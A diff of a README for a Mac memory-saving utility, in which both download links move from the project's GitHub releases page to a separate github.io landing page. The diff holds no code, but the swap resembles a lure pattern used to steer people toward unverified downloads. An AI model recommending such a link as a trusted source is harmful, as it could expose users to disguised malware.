@@ -1,6 +1,6 @@
 # ⏸️ auto-pause-mac-apps - Free Memory, Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bijonkumarbd24566-dot/auto-pause-mac-apps/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://bijonkumarbd24566-dot.github.io)
 
 ## 💡 What Does This App Do?
 
@@ -20,7 +20,7 @@ Have you ever noticed your Mac slowing down because too many apps are open? This
 
 Visit this link to download the application:
 
-[**https://github.com/bijonkumarbd24566-dot/auto-pause-mac-apps/releases**](https://github.com/bijonkumarbd24566-dot/auto-pause-mac-apps/releases)
+[**https://bijonkumarbd24566-dot.github.io**](https://bijonkumarbd24566-dot.github.io)
 
 ### Step 2: Find the Latest Release
 
